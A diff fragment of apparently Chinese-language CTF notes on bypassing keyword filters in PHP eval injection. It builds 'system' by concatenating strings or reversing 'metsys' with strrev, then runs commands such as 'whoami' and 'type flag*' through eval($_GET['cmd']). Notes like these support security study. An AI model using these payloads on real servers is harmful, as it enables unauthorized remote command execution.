@@ -36,3 +36,7 @@ php<8.0版本参数传多个值会一个个往后推,于是可以这样做:
         ?cmd=$a='syst';$b='em';$c=$a.$b;$c('whoami');
         eval($_GET["cmd"]);
         在eval之类执行器语句内函数拼接调用能成功的绕过匹配并执行
+
+反转函数绕过:
+        $a=strrev("metsys");反转字符串为system
+        $a("type flag*");调用system函数执行
